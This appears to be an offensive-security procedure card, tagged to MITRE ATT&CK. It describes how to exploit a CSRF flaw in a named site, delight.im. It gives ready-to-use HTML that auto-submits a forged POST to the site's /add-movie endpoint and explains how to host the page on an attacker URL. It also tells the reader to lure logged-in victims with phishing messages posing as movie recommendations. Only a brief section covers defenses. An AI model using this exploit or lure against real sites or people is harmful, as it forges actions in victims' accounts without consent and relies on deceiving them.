---
tags:
  - csrf
  - poc
  - html
  - drive-by
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:27:22.456Z'
sub_techniques: []
id: e740ddcd-1727-41ca-80eb-e1154f370a14
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Host-and-Visit-Malicious-CSRF-PoC-Page

## Summary

This procedure involves creating and hosting a malicious HTML proof-of-concept (PoC) page that exploits CSRF in delight.im by auto-submitting a form to add movies or series when visited by an authenticated user.

## Description

CSRF attacks in web applications like delight.im rely on tricking authenticated users into visiting a page that forges requests using their session. The PoC uses HTML forms with hidden fields and JavaScript to submit data to the vulnerable /add-movie or /add-series endpoint, which lacks CSRF token validation. This leads to unauthorized additions without user consent.

## Requirements

1. Text editor to create HTML file
2. Web server or hosting service (e.g., GitHub Pages, local Python server) to serve the PoC
3. Luring mechanism (e.g., email, social engineering) to get victim to visit while logged in
4. Knowledge of target endpoint (https://delight.im/add-movie)

## Defense

Defensive measures and detection strategies:

- Enforce CSRF tokens on all state-changing endpoints
- Educate users on phishing and suspicious links
- Implement Content Security Policy (CSP) to restrict form submissions
- Log and monitor unexpected POST requests to sensitive endpoints

## Objectives

1. Deliver the malicious page to the victim
2. Trigger automatic form submission using victim's session
3. Initiate the unauthorized action chain

## Instructions

### Step 1: Create PoC HTML File

**Context**: Craft the HTML with hidden form fields matching the add movie/series parameters (name, year, string).

Use a text editor to create movie.html:

```html
<!DOCTYPE html>
<html>
<body onload="document.getElementById('csrf-form').submit();">
<form id="csrf-form" action="https://delight.im/add-movie" method="POST">
    <input type="hidden" name="name" value="Attacker's Malicious Movie">
    <input type="hidden" name="year" value="2023">
    <input type="hidden" name="string" value="tt1234567">
</form>
</body>
</html>
```

> For series, change action to /add-series and adjust fields. The onload or script auto-submits on load.

### Step 2: Host the File

**Context**: Make the PoC accessible via URL for the victim to visit.

Upload to a hosting service or run a local server (e.g., python -m http.server 8000) and note the URL (e.g., http://attacker.com/movie.html).

> Ensure the host allows cross-origin POSTs; no special config needed for basic HTML.

### Step 3: Lure Victim to Visit

**Context**: Trick the authenticated user into loading the page.

Send the URL via email, chat, or embed in a phishing site, claiming it's a "recommended movie link."

> Victim clicks while logged into delight.im, triggering submission.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- csrf-poc
- malicious-html
